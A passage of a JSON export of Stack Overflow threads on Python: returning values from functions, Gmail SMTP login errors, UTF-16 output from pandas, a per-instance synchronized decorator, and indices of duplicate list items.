"question_id": 29402853, "link": "https://stackoverflow.com/questions/29402853/how-to-access-a-locally-defined-list-python/29402906#29402906", "title": "how to access a locally defined list (Python)", "body": "<blockquote>\n  <p>What is the best way to pass variables between functions without using\n  globals?</p>\n</blockquote>\n\n<p><strong>arguments</strong> to get values <strong>into</strong> functions, <strong>return values</strong> to get them out.  So in your case you only have the second problem to solve, and should just change the bare <code>return</code> (which returns a value of <code>None</code>) into <code>return integers</code> (which returns the result value you <strong>care</strong> about!-).</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user4724687"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 0, "accepted_answer_id": 29402906, "answer_count": 2, "score": 0, "last_activity_date": 1427933692, "creation_date": 1427932371, "last_edit_date": 1427933692, "question_id": 29402853, "link": "https://stackoverflow.com/questions/29402853/how-to-access-a-locally-defined-list-python", "title": "how to access a locally defined list (Python)", "body": "<p>I'm trying to check user-input against the list I created inside a function. What is the best way to pass variables between functions without using globals? </p>\n\n<pre><code>def counter():\n    integers = []\n    x = 0\n    while x &lt; 100:\n        x = x + 1\n        integers.append (x)\n        #print integers\n    return\n\nintegers_global = counter () \nprint integers_global\nspeed = int (raw_input (\"what is the speed of an unladen swallow in km/h (enter a number): \"))\nif speed in integers_global:\n    print \"the speed of the swallow is equal to\", speed, \"km/h\"\nelse:\n    print \"the speed of the swallow is equal to %r\" %speed\n</code></pre>\n"}, {"tags": ["python", "email", "smtp", "mime"], "comments": [{"owner": {"reputation": 322, "user_id": 1282144, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2651343b3621386a780990dc96109c9f?s=128&d=identicon&r=PG", "display_name": "Jasper", "link": "https://stackoverflow.com/users/1282144/jasper"}, "edited": false, "score": 0, "creation_date": 1427932083, "post_id": 29402710, "comment_id": 46980962, "body": "Are you sure you are using the right username and password? The error tells you &quot;Please log in via your web browser and then try again&quot; + it gives to a link to the Google help about username and password not being accepted: <a href=\"https://support.google.com/mail/answer/78754\" rel=\"nofollow noreferrer\">link</a>"}, {"owner": {"reputation": 156940, "user_id": 416467, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/32cad7487ccecc3740a62e797fc326dc?s=128&d=identicon&r=PG", "display_name": "kindall", "link": "https://stackoverflow.com/users/416467/kindall"}, "edited": false, "score": 0, "creation_date": 1427932436, "post_id": 29402710, "comment_id": 46981055, "body": "This isn&#39;t your immediate problem, but your message does not contain any headers. Or rather, it contains only a header, and that header is <code>GRRRRR!!!!!!</code>, which is not a valid header. Actually it does not include a body."}, {"owner": {"reputation": 1025, "user_id": 3161440, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90ea8a422e36143283d2d6aa7a62b776?s=128&d=identicon&r=PG&f=1", "display_name": "jkd", "link": "https://stackoverflow.com/users/3161440/jkd"}, "edited": false, "score": 0, "creation_date": 1427935845, "post_id": 29402710, "comment_id": 46981906, "body": "Also, you need to activate allow sign in from insecure sources in your google account."}], "answers": [{"tags": [], "owner": {"reputation": 1987, "user_id": 2317533, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/11f84de1d659deef11d4f2a75da58c76?s=128&d=identicon&r=PG", "display_name": "Fred Mitchell", "link": "https://stackoverflow.com/users/2317533/fred-mitchell"}, "is_accepted": true, "score": 1, "last_activity_date": 1427937886, "creation_date": 1427937886, "answer_id": 29403545, "question_id": 29402710, "link": "https://stackoverflow.com/questions/29402710/python-sending-email-wont-work-and-is-giving-long-error-messages/29403545#29403545", "title": "Python sending email won&#39;t work, and is giving long error messages", "body": "<p>You might need:</p>\n\n<p><code>server = smtplib.SMTP_SSL('smtp.gmail.com:465')</code></p>\n\n<p>instead of:</p>\n\n<pre><code>server = smtplib.SMTP('smtp.gmail.com:587')\n</code></pre>\n\n<p>and probably don't need the .ehlo ()</p>\n\n<p>See also <a href=\"https://support.google.com/accounts/answer/185833\" rel=\"nofollow\">https://support.google.com/accounts/answer/185833</a></p>\n"}], "owner": {"reputation": 589, "user_id": 4163963, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9617669977aaf426c10dcc6b6a0d7694?s=128&d=identicon&r=PG&f=1", "display_name": "QuantumFool", "link": "https://stackoverflow.com/users/4163963/quantumfool"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1078, "favorite_count": 0, "accepted_answer_id": 29403545, "answer_count": 1, "score": 0, "last_activity_date": 1427937886, "creation_date": 1427931462, "question_id": 29402710, "link": "https://stackoverflow.com/questions/29402710/python-sending-email-wont-work-and-is-giving-long-error-messages", "title": "Python sending email won&#39;t work, and is giving long error messages", "body": "<p>I'm testing a python script to send e-mail to myself:</p>\n\n<pre><code>import smtplib\nfromaddr = '----------@gmail.com'\ntoaddrs  = '----------@gmail.com'\nmsg = 'GRRRRR!!!!!!'\nusername = '----------@gmail.com'\npassword = '----------'\nserver = smtplib.SMTP('smtp.gmail.com:587')\nserver.ehlo()\nserver.starttls()\nserver.login(username, password)\nserver.sendmail(fromaddr, toaddrs, msg)\nserver.quit()\n</code></pre>\n\n<p>Where \"----------\" means \"private information.\" This is the error message I get:</p>\n\n<pre><code>Traceback (most recent call last):\n  File \"ms.py\", line 10, in &lt;module&gt;\n    server.login(username, password)\n  File \"/usr/lib/python2.7/smtplib.py\", line 615, in login\n    raise SMTPAuthenticationError(code, resp)\nsmtplib.SMTPAuthenticationError: (534, '5.7.14 &lt;https://accounts.google.com/ContinueSignIn?sarp=1&amp;scc=1&amp;plt=AKgnsbvXa\\n5.7.14 z7t5LRUd-e-nGxiMetNBY2KaLd8EP3SJVhw2EwccDQjlUi0FxHegAH2YrpvKdYIX2lHz9N\\n5.7.14 cMZ_w8kPxuXXhBPMbXA26tWu_HM0tt_4IC8aEct5VRz7z1J22epkLWXUx-COwh4rt2K2-_\\n5.7.14 1Lw71Ag70CBpsqYpfzScV-_mF7zHl_NFRflAn5sFnPftR_bX6hhGAHxj5rz1bx0U44sByk\\n5.7.14 t-arL3mQhKu-nfFzkcIvjlzuUh3w&gt; Please log in via your web browser and\\n5.7.14 then try again.\\n5.7.14 Learn more at\\n5.7.14 https://support.google.com/mail/bin/answer.py?answer=78754 p18sm2343352qkh.10 - gsmtp')\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"}, {"tags": ["python", "unicode", "pandas"], "answers": [{"comments": [{"owner": {"reputation": 217, "user_id": 2163106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e39550cf8ac1f5b2dc3d394bc1b719e1?s=128&d=identicon&r=PG", "display_name": "CultureQuant", "link": "https://stackoverflow.com/users/2163106/culturequant"}, "edited": false, "score": 0, "creation_date": 1427932070, "post_id": 29402785, "comment_id": 46980961, "body": "Well, the system accepted the file but there are a lot of Asian characters now at the end of each row of data and that&#39;s being read by the website as an incorrect format."}, {"owner": {"reputation": 217, "user_id": 2163106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e39550cf8ac1f5b2dc3d394bc1b719e1?s=128&d=identicon&r=PG", "display_name": "CultureQuant", "link": "https://stackoverflow.com/users/2163106/culturequant"}, "edited": false, "score": 0, "creation_date": 1428016022, "post_id": 29402785, "comment_id": 47019219, "body": "Ok. So I got Notepad++ and it is confirming that my prototype files are encoded as UCS-2LE but the new file I&#39;m generating using python, pandas, and DataFrames is adding a bunch of junk at the end of each line if I encode with UTF-16LE."}, {"owner": {"reputation": 14751, "user_id": 176569, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/edfaee6d982f519a6efdad5b2b6c12d0?s=128&d=identicon&r=PG", "display_name": "bpgergo", "link": "https://stackoverflow.com/users/176569/bpgergo"}, "reply_to_user": {"reputation": 217, "user_id": 2163106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e39550cf8ac1f5b2dc3d394bc1b719e1?s=128&d=identicon&r=PG", "display_name": "CultureQuant", "link": "https://stackoverflow.com/users/2163106/culturequant"}, "edited": false, "score": 0, "creation_date": 1428048463, "post_id": 29402785, "comment_id": 47027198, "body": "End when you encode it with UTF-8, then there is no junk added?"}, {"owner": {"reputation": 217, "user_id": 2163106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e39550cf8ac1f5b2dc3d394bc1b719e1?s=128&d=identicon&r=PG", "display_name": "CultureQuant", "link": "https://stackoverflow.com/users/2163106/culturequant"}, "edited": false, "score": 0, "creation_date": 1428163572, "post_id": 29402785, "comment_id": 47063357, "body": "That&#39;s correct: end with UTF-8 and I don&#39;t get any junk. But then the website I need to accept the file doesn&#39;t recognize it as a unicode file and rejects the file. @bpgergo"}, {"owner": {"reputation": 14751, "user_id": 176569, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/edfaee6d982f519a6efdad5b2b6c12d0?s=128&d=identicon&r=PG", "display_name": "bpgergo", "link": "https://stackoverflow.com/users/176569/bpgergo"}, "reply_to_user": {"reputation": 217, "user_id": 2163106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e39550cf8ac1f5b2dc3d394bc1b719e1?s=128&d=identicon&r=PG", "display_name": "CultureQuant", "link": "https://stackoverflow.com/users/2163106/culturequant"}, "edited": false, "score": 0, "creation_date": 1428171375, "post_id": 29402785, "comment_id": 47065689, "body": "This is strange, I don&#39;t understand how this could happen. This is what I would do to clarify the problem. I&#39;d have pandas encode the file with utf-8. Then I would use standard converter program <a href=\"http://www.gnu.org/savannah-checkouts/gnu/libiconv/documentation/libiconv-1.13/iconv.1.html\" rel=\"nofollow noreferrer\">iconv</a> to convert it from utf-8 to utf-16 and see if it is identical to the pandas utf-16 version, and see if it contains garbage and accepted by the website. <code>iconv -f utf-8 -t utf-16 utf8file.txt &gt; utf16file.txt</code>"}, {"owner": {"reputation": 217, "user_id": 2163106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e39550cf8ac1f5b2dc3d394bc1b719e1?s=128&d=identicon&r=PG", "display_name": "CultureQuant", "link": "https://stackoverflow.com/users/2163106/culturequant"}, "edited": false, "score": 0, "creation_date": 1428337711, "post_id": 29402785, "comment_id": 47111401, "body": "Had some problems with the iconv package but adding this block to my code did successfully eliminate the junk at the end of each line and the website recognized the file as a unicode file:       import codecs      with codecs.open(&#39;0000-2951-test.txt&#39;, &quot;r&quot;, &quot;utf-8&quot;) as sourceFile:      with codecs.open(&#39;2951.txt&#39;, &quot;w&quot;, &quot;utf-16&quot;) as targetFile:             while True:                      contents = sourceFile.read()             if not contents:                  break             targetFile.write(contents) Thanks for helping me find a solution @bpgergo"}], "tags": [], "owner": {"reputation": 14751, "user_id": 176569, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/edfaee6d982f519a6efdad5b2b6c12d0?s=128&d=identicon&r=PG", "display_name": "bpgergo", "link": "https://stackoverflow.com/users/176569/bpgergo"}, "is_accepted": true, "score": 5, "last_activity_date": 1427932566, "last_edit_date": 1427932566, "creation_date": 1427931922, "answer_id": 29402785, "question_id": 29402688, "link": "https://stackoverflow.com/questions/29402688/problems-writing-a-pandas-dataframe-into-a-unicode-text-file/29402785#29402785", "title": "problems writing a pandas DataFrame into a unicode text file", "body": "<p>\"unicode\" is not one particular encoding but a set of encodings. It can be utf-8, utf-16, utf-32. <a href=\"http://en.wikipedia.org/wiki/Comparison_of_Unicode_encodings\" rel=\"noreferrer\">more detailed explanation</a> </p>\n\n<p>in Windows, unicode often means utf-16, and it is possible that this website expects utf-16. try to encode your csv in utf-16 and see if it is \"unicode\" in Notepad and this website accepts it.</p>\n\n<pre><code>coa1.to_csv('0000-2951-test.txt',index=False, sep='\\t', encoding = 'utf-16')\n</code></pre>\n\n<p><strong>EDIT</strong> Instead of using Windows Notepad, I suggest to use a more decent text editor for your prototyping, which enables to precisely set the encoding. I would use <a href=\"http://www.sublimetext.com/2\" rel=\"noreferrer\">Sublime</a> or Notepad++ </p>\n"}], "owner": {"reputation": 217, "user_id": 2163106, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e39550cf8ac1f5b2dc3d394bc1b719e1?s=128&d=identicon&r=PG", "display_name": "CultureQuant", "link": "https://stackoverflow.com/users/2163106/culturequant"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1736, "favorite_count": 0, "accepted_answer_id": 29402785, "answer_count": 1, "score": 3, "last_activity_date": 1427932566, "creation_date": 1427931310, "question_id": 29402688, "link": "https://stackoverflow.com/questions/29402688/problems-writing-a-pandas-dataframe-into-a-unicode-text-file", "title": "problems writing a pandas DataFrame into a unicode text file", "body": "<p>I have written a program to generate a unicode text file to upload into a website. I have successfully prototyped this particular file using Microsoft Access and have noted that the website rejects the file as not a unicode text file if it is encoded as a utf-8 file. From the text editor (using Windows Notepad), if I save the file using just the unicode encoding in the drop-down box, the website I'm uploading into accepts the file just fine.</p>\n\n<p>So, with this context in mind, I've written a program to autogenerate the file using pandas and DataFrames. The last line of my program exports the DataFrame to a text file:</p>\n\n<pre><code> coa1.to_csv('0000-2951-test.txt',index=False, sep='\\t', encoding = 'utf-8')\n</code></pre>\n\n<p>This generates the right file but when I open it in Notepad, the encoding listed is ANSI and not unicode. How do I write my DataFrame to a unicode file? And what kind of unicode does Notepad mean by Unicode (when it doesn't have any additional qualifiers)?</p>\n"}, {"tags": ["python", "decorator", "python-decorators"], "answers": [{"comments": [{"owner": {"reputation": 11190, "user_id": 48956, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/06f001142c96af8fb111127e63d92579?s=128&d=identicon&r=PG", "display_name": "user48956", "link": "https://stackoverflow.com/users/48956/user48956"}, "edited": false, "score": 0, "creation_date": 1427931741, "post_id": 29402736, "comment_id": 46980884, "body": "Thank -- helpful. Why does the language generate unbound methods from functions? Why not just always have an unbound method? This seems to also prevent per-class synchronization."}, {"owner": {"reputation": 757655, "user_id": 95810, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e8d5fe90f1fe2148bf130cccd4dc311c?s=128&d=identicon&r=PG", "display_name": "Alex Martelli", "link": "https://stackoverflow.com/users/95810/alex-martelli"}, "reply_to_user": {"reputation": 11190, "user_id": 48956, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/06f001142c96af8fb111127e63d92579?s=128&d=identicon&r=PG", "display_name": "user48956", "link": "https://stackoverflow.com/users/48956/user48956"}, "edited": false, "score": 0, "creation_date": 1427932202, "post_id": 29402736, "comment_id": 46980998, "body": "@user48956, in Python 3 (ever since 3.0) there are only <b>bound</b> methods -- <b>unbound</b> ones have been removed from the language, so that just the <i>two</i> types, functions and bound-methods, can do it all more simply.  I.e, the design back in the ancient days of Python 2.0 (15 years ago) was more complicated than necessary.  However, the improvement in 3.0 was far more of a simplification than what you suggest, and won&#39;t help you in the least in pursuing the approach you&#39;d favor (even if your decorator&#39;s arg <i>was</i> an unbound method, its <code>im_self</code> would be <code>None</code>, so, no help at all anyway!-)."}], "tags": [], "owner": {"reputation": 757655, "user_id": 95810, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e8d5fe90f1fe2148bf130cccd4dc311c?s=128&d=identicon&r=PG", "display_name": "Alex Martelli", "link": "https://stackoverflow.com/users/95810/alex-martelli"}, "is_accepted": false, "score": 4, "last_activity_date": 1427931594, "creation_date": 1427931594, "answer_id": 29402736, "question_id": 29402606, "link": "https://stackoverflow.com/questions/29402606/possible-to-create-a-synchronized-decorator-thats-aware-of-a-methods-object/29402736#29402736", "title": "Possible to create a @synchronized decorator that&#39;s aware of a method&#39;s object?", "body": "<blockquote>\n  <p>(1) What's confusing is that the func parameter passed to my decorator\n  changes type before it gets passed into the wrapper-generator. This\n  seem is rude and unnecessary. Why does this happen?</p>\n</blockquote>\n\n<p>It doesn't!  Rather, function objects (and other descriptors) produce their <code>__get__</code>'s results when that method of theirs is called -- and <strong>that</strong> result is the method object!</p>\n\n<p>But what lives in the <code>class</code>'s <code>__dict__</code> is always the descriptor -- specifically, the <strong>function</strong> object!  Check it out...:</p>\n\n<pre><code>&gt;&gt;&gt; class X(object):\n...   def x(self): pass\n... \n&gt;&gt;&gt; X.__dict__['x']\n&lt;function x at 0x10fe04e60&gt;\n&gt;&gt;&gt; type(X.__dict__['x'])\n&lt;type 'function'&gt;\n</code></pre>\n\n<p>See?  No method objects around anywhere <strong>at all</strong>!-)</p>\n\n<p>Therefore, no <code>im_self</code> around either, at decoration time -- and you'll need to go with your introspection-based alternative idea.</p>\n"}, {"comments": [{"owner": {"reputation": 8790, "user_id": 627042, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/803e178f33b9d1244688d2ab458db4d0?s=128&d=identicon&r=PG", "display_name": "Erik Aronesty", "link": "https://stackoverflow.com/users/627042/erik-aronesty"}, "edited": false, "score": 0, "creation_date": 1583354653, "post_id": 29402953, "comment_id": 107092180, "body": "This is the better answer, IMO.   It&#39;s safer, and fits more use cases than a decorators that often assume global locks."}, {"owner": {"reputation": 55, "user_id": 6594959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ff688f64df2ba681c20e114cffc2a5a?s=128&d=identicon&r=PG&f=1", "display_name": "Javon", "link": "https://stackoverflow.com/users/6594959/javon"}, "edited": false, "score": 1, "creation_date": 1605994691, "post_id": 29402953, "comment_id": 114825715, "body": "Minor typo, but it should be <code>hasattr</code>"}], "tags": [], "owner": {"reputation": 156940, "user_id": 416467, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/32cad7487ccecc3740a62e797fc326dc?s=128&d=identicon&r=PG", "display_name": "kindall", "link": "https://stackoverflow.com/users/416467/kindall"}, "is_accepted": false, "score": 5, "last_activity_date": 1606164310, "last_edit_date": 1606164310, "creation_date": 1427933052, "answer_id": 29402953, "question_id": 29402606, "link": "https://stackoverflow.com/questions/29402606/possible-to-create-a-synchronized-decorator-thats-aware-of-a-methods-object/29402953#29402953", "title": "Possible to create a @synchronized decorator that&#39;s aware of a method&#39;s object?", "body": "<p>You can't get <code>self</code> at decoration time because the decorator is applied at function definition time. No <code>self</code> exists yet; in fact, the <em>class</em> doesn't exist yet.</p>\n<p>If you're willing to store your lock <em>on the instance</em> (which is arguably where a per-instance value should go) then this might do ya:</p>\n<pre><code>def synchronizedMethod(func):\n    def _synchronized(self, *args, **kw):\n         if not hasattr(self, &quot;_lock&quot;): self._lock = oneLockPerObject(self)\n         with self._lock: return func(self, *args, **kw)\n    return _synchronized\n</code></pre>\n<p>You could also generate the lock in your <code>__init__()</code> method on a base class of some sort, and store it on the instance in the same way. That simplifies your decorator because you don't have to check for the existence of the <code>self._lock</code> attribute.</p>\n"}, {"comments": [{"owner": {"reputation": 103, "user_id": 2779181, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e21273ac222d6a734bb53180c645194a?s=128&d=identicon&r=PG", "display_name": "zhy", "link": "https://stackoverflow.com/users/2779181/zhy"}, "edited": false, "score": 0, "creation_date": 1548060587, "post_id": 29403915, "comment_id": 95393463, "body": "remember to use <code>decorator</code> from <code>wrapt</code> module"}], "tags": [], "owner": {"reputation": 54548, "user_id": 128141, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70dfb4afd84b106d0855184bf0ae4675?s=128&d=identicon&r=PG", "display_name": "Graham Dumpleton", "link": "https://stackoverflow.com/users/128141/graham-dumpleton"}, "is_accepted": true, "score": 21, "last_activity_date": 1548064098, "last_edit_date": 1548064098, "creation_date": 1427940801, "answer_id": 29403915, "question_id": 29402606, "link": "https://stackoverflow.com/questions/29402606/possible-to-create-a-synchronized-decorator-thats-aware-of-a-methods-object/29403915#29403915", "title": "Possible to create a @synchronized decorator that&#39;s aware of a method&#39;s object?", "body": "<p>Go read:</p>\n\n<ul>\n<li><a href=\"https://github.com/GrahamDumpleton/wrapt/tree/develop/blog\" rel=\"nofollow noreferrer\">https://github.com/GrahamDumpleton/wrapt/tree/develop/blog</a></li>\n</ul>\n\n<p>and in particular:</p>\n\n<ul>\n<li><a href=\"https://github.com/GrahamDumpleton/wrapt/blob/develop/blog/07-the-missing-synchronized-decorator.md\" rel=\"nofollow noreferrer\">https://github.com/GrahamDumpleton/wrapt/blob/develop/blog/07-the-missing-synchronized-decorator.md</a></li>\n<li><a href=\"https://github.com/GrahamDumpleton/wrapt/blob/develop/blog/08-the-synchronized-decorator-as-context-manager.md\" rel=\"nofollow noreferrer\">https://github.com/GrahamDumpleton/wrapt/blob/develop/blog/08-the-synchronized-decorator-as-context-manager.md</a></li>\n</ul>\n\n<p>The <code>wrapt</code> module then contains the <code>@synchronized</code> decorator described there.</p>\n\n<ul>\n<li><a href=\"https://pypi.python.org/pypi/wrapt\" rel=\"nofollow noreferrer\">https://pypi.python.org/pypi/wrapt</a></li>\n</ul>\n\n<p>The full implementation is flexible enough to do:</p>\n\n<pre><code>@synchronized # lock bound to function1\ndef function1():\n    pass \n\n@synchronized # lock bound to function2\ndef function2():\n    pass \n\n@synchronized # lock bound to Class\nclass Class(object):  \n\n    @synchronized # lock bound to instance of Class\n    def function_im(self):\n        pass \n\n    @synchronized # lock bound to Class\n    @classmethod\n    def function_cm(cls):\n        pass\n\n    @synchronized # lock bound to function_sm\n    @staticmethod\n    def function_sm():\n        pass\n</code></pre>\n\n<p>Along with context manager like usage as well:</p>\n\n<pre><code>class Object(object):  \n\n    @synchronized\n    def function_im_1(self):\n        pass  \n\n    def function_im_2(self):\n        with synchronized(self):\n            pass\n</code></pre>\n\n<p>Further information and examples can also be found in:</p>\n\n<ul>\n<li><a href=\"http://wrapt.readthedocs.org/en/latest/examples.html\" rel=\"nofollow noreferrer\">http://wrapt.readthedocs.org/en/latest/examples.html</a></li>\n</ul>\n\n<p>There is also a conference talk you can watch on how this is implemented at:</p>\n\n<ul>\n<li><a href=\"https://www.youtube.com/watch?v=EB6AH-85zfY&amp;t=1s\" rel=\"nofollow noreferrer\">https://www.youtube.com/watch?v=EB6AH-85zfY&amp;t=1s</a></li>\n</ul>\n"}], "owner": {"reputation": 11190, "user_id": 48956, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/06f001142c96af8fb111127e63d92579?s=128&d=identicon&r=PG", "display_name": "user48956", "link": "https://stackoverflow.com/users/48956/user48956"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 9273, "favorite_count": 3, "accepted_answer_id": 29403915, "answer_count": 3, "score": 9, "last_activity_date": 1606164310, "creation_date": 1427930870, "last_edit_date": 1427931469, "question_id": 29402606, "link": "https://stackoverflow.com/questions/29402606/possible-to-create-a-synchronized-decorator-thats-aware-of-a-methods-object", "title": "Possible to create a @synchronized decorator that&#39;s aware of a method&#39;s object?", "body": "<p>I'm trying to create a @synchronized wrapper that creates one Lock per object and makes method calls thread safe. I can only do this if I can access method.im_self of the method in the wrapped method.</p>\n\n<pre><code>    class B:\n        def f(self): pass\n\n    assert inspect.ismethod( B.f ) # OK\n    assert inspect.ismethod( B().f ) # OK\n    print B.f    # &lt;unbound method B.f&gt;\n    print B().f  # &lt;bound method B.f of &lt;__main__.B instance at 0x7fa2055e67e8&gt;&gt;\n\n\n\n    def synchronized(func):\n        # func is not bound or unbound!\n        print func  # &lt;function f at 0x7fa20561b9b0&gt;    !!!!\n\n        assert inspect.ismethod(func)  # FAIL\n        # ... allocate one lock per C instance\n        return func\n\n    class C:\n        @synchronized\n        def f(self): pass\n</code></pre>\n\n<p>(1) What's confusing is that the func parameter passed to my decorator changes type before it gets passed into the wrapper-generator. This seem is rude and unnecessary. Why does this happen?</p>\n\n<p>(2) Is there some decorator magic by which I can make method calls to an object mutex-ed (i.e. one lock per object, not per class).</p>\n\n<p>UPDATE: There are many examples of @synchronized(lock) wrappers. However, really what I want is @synchronized(self). I <em>can</em> solve it like this:</p>\n\n<pre><code>    def synchronizedMethod(func):\n        def _synchronized(*args, **kw):\n             self = args[0]\n             lock = oneLockPerObject(self)\n             with lock: return func(*args, **kw)\n        return _synchronized\n</code></pre>\n\n<p>However, because its much more efficient, I'd prefer:</p>\n\n<pre><code>    def synchronizedMethod(func):\n        lock = oneLockPerObject(func.im_self)\n\n        def _synchronized(*args, **kw):\n             with lock: return func(*args, **kw)\n\n        return _synchronized\n</code></pre>\n\n<p>Is this possible?</p>\n"}, {"tags": ["python", "python-3.x"], "comments": [{"owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 0, "creation_date": 1427932579, "post_id": 29402594, "comment_id": 46981103, "body": "How long are the lists you&#39;re working with?"}], "answers": [{"tags": [], "owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "is_accepted": false, "score": 3, "last_activity_date": 1427931304, "creation_date": 1427931304, "answer_id": 29402686, "question_id": 29402594, "link": "https://stackoverflow.com/questions/29402594/finding-indices-of-multiple-occurring-items-in-a-list/29402686#29402686", "title": "Finding indices of multiple occurring items in a list", "body": "<pre><code>&gt;&gt;&gt; lst = ['A', 'B', 'A', 'C', 'A']\n&gt;&gt;&gt; [i for i in range(len(lst)) if lst.count(lst[i]) &gt; 1]\n[0, 2, 4]\n</code></pre>\n\n<p>That said, assembling a list of indices probably indicates that your algorithm could be improved.</p>\n"}, {"tags": [], "owner": {"reputation": 44495, "user_id": 3058609, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/2c0357556707713572abbf637a907ef9?s=128&d=identicon&r=PG&f=1", "display_name": "Adam Smith", "link": "https://stackoverflow.com/users/3058609/adam-smith"}, "is_accepted": false, "score": 2, "last_activity_date": 1427932422, "last_edit_date": 1427932422, "creation_date": 1427931925, "answer_id": 29402786, "question_id": 29402594, "link": "https://stackoverflow.com/questions/29402594/finding-indices-of-multiple-occurring-items-in-a-list/29402786#29402786", "title": "Finding indices of multiple occurring items in a list", "body": "<p>I'd do this:</p>\n\n<pre><code>import collections\n\nd = collections.defaultdict(list)\n\nfor idx,el in enumerate(lst):\n    d[el].append(idx)\n    # you can also do this with d as a normal dict, and instead do\n    # d.setdefault(el, []).append(idx)\n\n# this builds {'A':[0,1,3], 'B':[2,4], 'C':[5]} from\n# ['A','A','B','A','B','C']\n\nresult = [idx for idxs in d.values() for idx in idxs if len(idxs) &gt; 1]\n# this builds [0,1,3,2,4] from\n# {'A':[0,1,3], 'B':[2,4], 'C':[5]}\n</code></pre>\n\n<p>It also avoids the need to call <code>list.count</code> n times, which should perform massively faster for a larger dataset.</p>\n\n<p>Alternatively you could leverage <code>collections.Counter</code> to get all the values that happen multiple times, then pull all their indices at once.</p>\n\n<pre><code>import collections\n\nc = set([el for el,val in collections.Counter(lst).items() if val&gt;1])\n# gives {'A','B'}\nresult = [idx for idx,el in enumerate(lst) if el in c]\n# gives [1,2,3,4]\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 4736608, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/916592703a0e8951f4ccefb41a4a0b56?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel Arnanda", "link": "https://stackoverflow.com/users/4736608/daniel-arnanda"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1427932422, "creation_date": 1427930795, "question_id": 29402594, "link": "https://stackoverflow.com/questions/29402594/finding-indices-of-multiple-occurring-items-in-a-list", "title": "Finding indices of multiple occurring items in a list", "body": "<p>I'm trying to accumulate a list of indices of items that occur multiple times, given a list. Not sure how to go about doing that as my code only manages to compare <code>pattern[1]</code> and <code>pattern[2]</code> before terminating.</p>\n\n<pre><code>def test(pattern):\n     \"\"\"(list) -&gt; list of int\n\n     &gt;&gt;&gt; test(['A', 'B', 'A', 'C', 'A'])\n     [0, 2, 4]\n     &gt;&gt;&gt; test(['A', 'B'])\n     []\n     \"\"\"\n     indices = []\n     new_list = []\n\n     for i in range(len(pattern) - 1): \n          if pattern[i][-1] == pattern[i + 1]:  \n              indices.append(i)\n              new_list = phoneme_list[max(indices):]\n\n      return new_list\n</code></pre>\n"}, {"tags": ["python", "amazon-mws"], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 4740287, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yaF8P.jpg?s=128&g=1", "display_name": "cm9090", "link": "https://stackoverflow.com/users/4740287/cm9090"}, "edited": false, "score": 0, "creation_date": 1427932519, "post_id": 29402640, "comment_id": 46981081, "body": "Awesome thank you! I found another workaround for people who may be having issues that are unrelated. You can pull the data from the web: response = urllib2.urlopen(&#39;<a href=\"http://www.website.com/output/nvt.txt&#39;\" rel=\"nofollow noreferrer\">website.com/output/nvt.txt&#39;</a>) feed_dat = response.read()"}], "tags": [], "owner": {"reputation": 5514, "user_id": 3190758, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/MM5AT.jpg?s=128&g=1", "display_name": "grovesNL", "link": "https://stackoverflow.com/users/3190758/grovesnl"}, "is_accepted": true, "score": 3, "last_activity_date": 1427931503, "last_edit_date": 1427931503, "creation_date": 1427931018, "answer_id": 29402640, "question_id": 29402585, "link": 